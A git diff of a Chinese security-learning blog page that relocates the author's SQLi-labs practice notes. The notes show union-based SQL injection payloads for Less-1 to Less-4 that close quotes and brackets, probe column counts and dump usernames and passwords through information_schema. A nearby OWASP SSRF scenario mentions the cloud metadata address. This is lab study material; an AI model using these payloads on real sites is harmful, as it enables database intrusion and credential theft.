@@ -162,167 +162,6 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://10vexh.top/2022/01/02/sql-lab%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="10vexh">
-      <meta itemprop="description" content="水至清则无鱼">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="good good study,day day up.">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/01/02/sql-lab%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">sql-lab刷题记录</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-01-02 21:15:03" itemprop="dateCreated datePublished" datetime="2022-01-02T21:15:03+08:00">2022-01-02</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-01-07 01:17:00" itemprop="dateModified" datetime="2022-01-07T01:17:00+08:00">2022-01-07</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="sql-lab刷题记录"><a href="#sql-lab刷题记录" class="headerlink" title="sql-lab刷题记录"></a>sql-lab刷题记录</h1><p>​        sqllab是atao师傅推荐我用来学sql的，网上已经有很多现成的writeup，写的知识点也比我完善，我只是用来简单记录一下自己的学习的过程。搭建的方法也很简单，网上都有，记得php版本要在7.0以前，避免要更改sql的函数。</p>
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>为了方便后面做题，我先找到目标的数据库，然后在命令行中进行调试方便找到目标。</p>
-<p>先是默认的账号密码进入</p>
-<p>mysql -uroot -p123456</p>
-<p>用<code>show databases;</code></p>
-<p>找到默认的数据库security,</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases ;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| challenges         |</span><br><span class="line">| dvwa               |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| pikachu            |</span><br><span class="line">| security           |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure>
-
-<p>然后<code>use security</code>，进入数据库</p>
-<p><code>show tables;</code></p>
-<p>找到表users</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables ;</span><br><span class="line">+--------------------+</span><br><span class="line">| Tables_in_security |</span><br><span class="line">+--------------------+</span><br><span class="line">| emails             |</span><br><span class="line">| referers           |</span><br><span class="line">| uagents            |</span><br><span class="line">| users              |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure>
-
-<p>在表中进行搜索，方便做题。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where 1=1;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="Less-1-基于错误的GET单引号字符型注入"><a href="#Less-1-基于错误的GET单引号字符型注入" class="headerlink" title="Less-1 基于错误的GET单引号字符型注入"></a>Less-1 基于错误的GET单引号字符型注入</h2><p>首先根据题目名字，尝试输入<code>?id=-1&#39;</code></p>
-<p>返回了报错的信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;-1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>
-
-<p>然后我们进入源码中查看，发现其从中读入的数据，没有经过处理，直接读入</p>
-<p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p>
-<p>LIMIT表示可以返回的记录数。</p>
-<p>我们尝试在数据库中利用该语句进行查询，发现是否加’都能正常返回</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=&#x27;1&#x27; limit 0,1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">mysql&gt; select * from users where id=1 limit 0,1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure>
-
-<p>而如果输入<code>?id=1&#39;</code>加了额外的<code>&#39;</code>意味着会让sql语句进行提前闭合，从而报错</p>
-<p><code>select * from users where id=&#39;1&#39;&#39; limit 0,1;</code></p>
-<p>而我们将后面部分利用<code>?id=1&#39;#</code>注释掉，则可以正常返回空的查询。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=&#x27;1&#x27;#&#x27; limit 0,1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure>
-
-<p>当我们输入1’# 的时候，回车还需要一个冒号作为闭合，因为系统读到#后，不会继续往下面读，默认下面的都是注释忽略了，进而达到绕过的目的。</p>
-<p>因此我们可以考虑通过在1’后面加上自己想查询的东西，得到想要的答案。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=&#x27;1&#x27; order by 1,2,3#&#x27; limit 0,1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">mysql&gt; select * from users where id=&#x27;1&#x27; order by 1,2,3,4#&#x27; limit 0,1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">ERROR 1054 (42S22): Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>通过<code>?id=1&#39; order by 1,2,3--+</code>，发现其中存在三行,此时可以通过联合注入的方式进行查询。</p>
-<p><code>?id=-1&#39; union select 1,2,3--+</code>发现在2，3的位置会进行回显。</p>
-<p>因此我们可以开始注入了，一般的思路是获取字段数-&gt;数据库名-&gt;表名-&gt;列名-&gt;值</p>
-<p>字段数就靠上面的order by进行猜解，或者通过union select直接尝试，直到遇到报错。</p>
-<p>我们已知了有3列，而2，3列会回显，因此我们下一步进行查数据库名。</p>
-<p>先在数据库里试一下。有几个常用的查询的默认</p>
-<p>database()：当前网站使用的数据库</p>
-<p>version()：当前Mysql的版本</p>
-<p>user()：当前Mysql的用户</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=&#x27;-1&#x27; union select version(),user(),database()#&#x27; limit 0,1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+--------+----------------+----------+</span><br><span class="line">| id     | username       | password |</span><br><span class="line">+--------+----------------+----------+</span><br><span class="line">| 5.7.26 | root@localhost | security |</span><br><span class="line">+--------+----------------+----------+</span><br></pre></td></tr></table></figure>
-
-<p>因此我们再在网站中进行查询，<code>?id=-1&#39; union select 1,user(),database()--+</code>，进而得到数据库名和用户。</p>
-<p>接着查询表。</p>
-<p>同样先试一下</p>
-<p>group_concat()：表示把一个分组的值串起来。</p>
-<p>information_schema：mysql自带的信息数据库存在着存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=&#x27;-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema= &#x27;security&#x27;#&#x27; limit 0,1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----+----------+-------------------------------+</span><br><span class="line">| id | username | password                      |</span><br><span class="line">+----+----------+-------------------------------+</span><br><span class="line">|  1 | 2        | emails,referers,uagents,users |</span><br><span class="line">+----+----------+-------------------------------+</span><br></pre></td></tr></table></figure>
-
-<p>因此我们再在网站中进行查询，<code>?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema= &#39;security&#39;--+</code>，得到表名。</p>
-<p>再对user表进行查询。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=&#x27;-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema= &#x27;security&#x27; and table_name=&#x27;users&#x27;#&#x27; limit 0,1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----+----------+----------------------+</span><br><span class="line">| id | username | password             |</span><br><span class="line">+----+----------+----------------------+</span><br><span class="line">|  1 | 2        | id,username,password |</span><br><span class="line">+----+----------+----------------------+</span><br></pre></td></tr></table></figure>
-
-<p>再在网站中进行查询<code>?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema= &#39;security&#39; and table_name=&#39;users&#39;--+</code>，得到字段名。</p>
-<p>最后查用户名和密码。(格式太丑不放了)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;-1&#x27; union select 1,group_concat(username),group_concat(password) from users#&#x27; limit 0,1;</span><br></pre></td></tr></table></figure>
-
-<p>在网站中查询<code>?id=-1&#39; union select 1,group_concat(username),group_concat(password) from users--+</code></p>
-<p>会回显</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</span><br><span class="line">Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span><br></pre></td></tr></table></figure>
-
-<p>然后差不多就完了，接着下一题。</p>
-<h2 id="Less-2-基于错误的get整型注入"><a href="#Less-2-基于错误的get整型注入" class="headerlink" title="Less-2 基于错误的get整型注入"></a>Less-2 基于错误的get整型注入</h2><p>这题与上一题看起来差不多，只在于一个<code>&#39;&#39;</code>的差别当我们以?<code>id=-1 or 1=1#</code>进行判断报错的时候i，发现返回了整个包裹的<code>&#39; or 1=1 LIMIT 0,1</code>所以可以判断我们多输入了一个<code>&#39;</code>,是多余的，查看代码源码也发现如此</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">//第一题的</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">//第二题的</span><br></pre></td></tr></table></figure>
-
-<p><code>?id=-1 union select 1,2,3#</code> 判断注入点</p>
-<p><code>?id=-1 union select 1,database(),version()#</code> 取数据库名</p>
-<p><code>?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;#</code>  取表名</p>
-<p><code>?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;#</code> 取列</p>
-<p><code>?id=-1 union select 1,group_concat(username),group_concat(password) from users#</code> 取内容</p>
-<h2 id="Less-3-基于错误的get单引号变形字符型注入"><a href="#Less-3-基于错误的get单引号变形字符型注入" class="headerlink" title="Less-3 基于错误的get单引号变形字符型注入"></a>Less-3 基于错误的get单引号变形字符型注入</h2><p>同样用<code>?id=-1&#39; or 1=1#</code>测试，发现返回的错误为<code>&#39;) LIMIT 0,1</code>，证明这次的是用<code>)</code>进行包裹的。</p>
-<p>再次查看源代码，发现确实。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">//第一题的</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">//第二题的</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">//第三题的</span><br></pre></td></tr></table></figure>
-
-<p>然后在这里我才意识到<code>?id=-1&#39; or 1=1#</code>是用不了的，而<code>?id=-1&#39; or 1=1--+</code>可以用，我本来以为–+一样是注释符，查了资料才发现，<code>--</code>并不是注释符，而<code>--</code>后还要加上空格，而web中<code>空格</code>和<code>+</code>等价，所以我们一般用<code>--+</code>，其他常用的注释符还有<code>/**/</code>和<code>#</code></p>
-<p>所以这题我们用–+</p>
-<p><code>?id=-1&#39;)  union select 1,2,3--+</code> 找注入点</p>
-<p><code>?id=-1&#39;)  union select 1,database(),user()--+</code> 找数据库名</p>
-<p><code>?id=-1&#39;)  union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code> 取表名</p>
-<p><code>?id=-1&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39;and table_name=&#39;users&#39;--+</code>  取列</p>
-<p><code>?id=-1&#39;) union select 1,group_concat(username),group_concat(password) from users--+</code> 取内容</p>
-<h2 id="Less-4-基于错误的GET双引号字符型注入"><a href="#Less-4-基于错误的GET双引号字符型注入" class="headerlink" title="Less-4 基于错误的GET双引号字符型注入"></a>Less-4 基于错误的GET双引号字符型注入</h2><p>还是先试一下<code>?id=-1&#39; or 1=1#</code>，然后发现没有任何报错的反应，然后我选择直接看了源码，发现这次的代码与之前有所不同</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">//第一题的</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">//第三题的</span><br><span class="line">$id = &#x27;&quot;&#x27; . $id . &#x27;&quot;&#x27;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br><span class="line">//第四题</span><br></pre></td></tr></table></figure>
-
-<p><code>$id = &#39;&quot;&#39; . $id . &#39;&quot;&#39;;</code> 表示在php中.是用来连接的，表示把$id存储的值加上一个双引号然后在赋值给$id 这个变量，很明显我们这题要用到双引号的绕过。</p>
-<p>当我们将用<code>?id=1&quot;</code>进行报错的验证，会发现返回的错误为<code>&quot;1&quot;&quot;) LIMIT 0,1</code>，从而可以判断在该处要进行双引号和括号的闭合</p>
-<p><code>?id=-1&quot;) union select 1,2,3--+</code> 找注入点</p>
-<p><code>?id=-1&quot;) union select 1,database(),user()--+</code> 找数据库</p>
-<p><code>?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code> 找表名</p>
-<p><code>?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;--+</code> 找列名</p>
-<p><code>?id=-1&quot;) union select 1,group_concat(username),group_concat(password) from users--+</code> 取数</p>
-<h2 id="Less-5-双注入GET单引号字符型注入"><a href="#Less-5-双注入GET单引号字符型注入" class="headerlink" title="Less-5 双注入GET单引号字符型注入"></a>Less-5 双注入GET单引号字符型注入</h2>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://10vexh.top/2022/01/02/2021%E7%89%88OWASP-TOP-10/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -593,6 +432,167 @@
 <p><strong>场景#3：</strong>访问云服务的元数据存储。大多数云提供商都有元数据存储，例如<a target="_blank" rel="noopener" href="http://169.254.169.254/%E3%80%82%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E8%AF%BB%E5%8F%96%E5%85%83%E6%95%B0%E6%8D%AE%E6%9D%A5%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E3%80%82">http://169.254.169.254/。攻击者可以读取元数据来获取敏感信息。</a></p>
 <p><strong>场景#4：</strong>破坏内部服务——攻击者可以滥用内部服务进行进一步的攻击，例如远程代码执行 (RCE) 或拒绝服务 (DoS)。</p>
 
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://10vexh.top/2022/01/02/sql-lab%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="10vexh">
+      <meta itemprop="description" content="水至清则无鱼">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="good good study,day day up.">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/01/02/sql-lab%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">sql-lab刷题记录</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-01-02 21:15:03" itemprop="dateCreated datePublished" datetime="2022-01-02T21:15:03+08:00">2022-01-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-01-07 01:17:00" itemprop="dateModified" datetime="2022-01-07T01:17:00+08:00">2022-01-07</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="sql-lab刷题记录"><a href="#sql-lab刷题记录" class="headerlink" title="sql-lab刷题记录"></a>sql-lab刷题记录</h1><p>​        sqllab是atao师傅推荐我用来学sql的，网上已经有很多现成的writeup，写的知识点也比我完善，我只是用来简单记录一下自己的学习的过程。搭建的方法也很简单，网上都有，记得php版本要在7.0以前，避免要更改sql的函数。</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>为了方便后面做题，我先找到目标的数据库，然后在命令行中进行调试方便找到目标。</p>
+<p>先是默认的账号密码进入</p>
+<p>mysql -uroot -p123456</p>
+<p>用<code>show databases;</code></p>
+<p>找到默认的数据库security,</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases ;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| challenges         |</span><br><span class="line">| dvwa               |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| pikachu            |</span><br><span class="line">| security           |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure>
+
+<p>然后<code>use security</code>，进入数据库</p>
+<p><code>show tables;</code></p>
+<p>找到表users</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables ;</span><br><span class="line">+--------------------+</span><br><span class="line">| Tables_in_security |</span><br><span class="line">+--------------------+</span><br><span class="line">| emails             |</span><br><span class="line">| referers           |</span><br><span class="line">| uagents            |</span><br><span class="line">| users              |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure>
+
+<p>在表中进行搜索，方便做题。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where 1=1;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Less-1-基于错误的GET单引号字符型注入"><a href="#Less-1-基于错误的GET单引号字符型注入" class="headerlink" title="Less-1 基于错误的GET单引号字符型注入"></a>Less-1 基于错误的GET单引号字符型注入</h2><p>首先根据题目名字，尝试输入<code>?id=-1&#39;</code></p>
+<p>返回了报错的信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;-1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>然后我们进入源码中查看，发现其从中读入的数据，没有经过处理，直接读入</p>
+<p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p>
+<p>LIMIT表示可以返回的记录数。</p>
+<p>我们尝试在数据库中利用该语句进行查询，发现是否加’都能正常返回</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=&#x27;1&#x27; limit 0,1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">mysql&gt; select * from users where id=1 limit 0,1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure>
+
+<p>而如果输入<code>?id=1&#39;</code>加了额外的<code>&#39;</code>意味着会让sql语句进行提前闭合，从而报错</p>
+<p><code>select * from users where id=&#39;1&#39;&#39; limit 0,1;</code></p>
+<p>而我们将后面部分利用<code>?id=1&#39;#</code>注释掉，则可以正常返回空的查询。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=&#x27;1&#x27;#&#x27; limit 0,1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure>
+
+<p>当我们输入1’# 的时候，回车还需要一个冒号作为闭合，因为系统读到#后，不会继续往下面读，默认下面的都是注释忽略了，进而达到绕过的目的。</p>
+<p>因此我们可以考虑通过在1’后面加上自己想查询的东西，得到想要的答案。</p>
